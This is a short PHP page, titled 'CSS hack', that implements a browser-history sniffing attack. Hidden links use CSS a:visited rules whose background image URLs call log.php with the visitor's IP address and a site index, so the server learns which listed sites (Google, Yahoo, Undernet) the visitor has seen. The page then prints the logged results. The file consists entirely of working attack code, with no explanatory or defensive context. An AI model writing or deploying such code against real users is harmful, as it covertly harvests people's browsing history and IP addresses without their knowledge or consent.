<?php
    $sites = array(
        "http://www.google.com",
        "http://www.yahoo.com",
        "http://www.undernet.org"
    );

    define("LOG", "css.txt");

?>
<html>
<head><title>CSS hack</title></head>
<body>
<style>
    a, a:visited {
        display: block;
        color:#fff;
        background-color:#fff;
        position: absolute;
        text-decoration:none;
        top: 0;
    }
<?php
    for ($i = 0; $i < count($sites); $i++) {
    $rand = rand(1000000, 9999999);
    echo <<<EOF
    a:visited span.span$i {
        display:block;
        background: url(log.php?{$_SERVER['REMOTE_ADDR']}-$rand-$i);
        position:absolute;
        top:0;
        font-size:0.9em;
    }
EOF;

    }
?>

</style>
<?php
    for ($i = 0; $i < count($sites); $i++) {
        echo "<a href='{$sites[$i]}'>{$sites[$i]}<span class='span$i'></span></a>";
    }
?>
</BR></BR>
Logged info for you: </BR>

<?php
    $lines = @file(LOG);
    if (!$lines) return;

    error_reporting(E_WARNING);
    $have = array();
    foreach ($lines as $l) {
        preg_match('/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\-(\d{7})-(\d+)/', trim($l), $matches);
        if (!$have[$matches[3]]) {
            print $sites[$matches[3]] . "</BR>";
            $have[$matches[3]] = 1;
        }
    }
?>
</body>
</html>
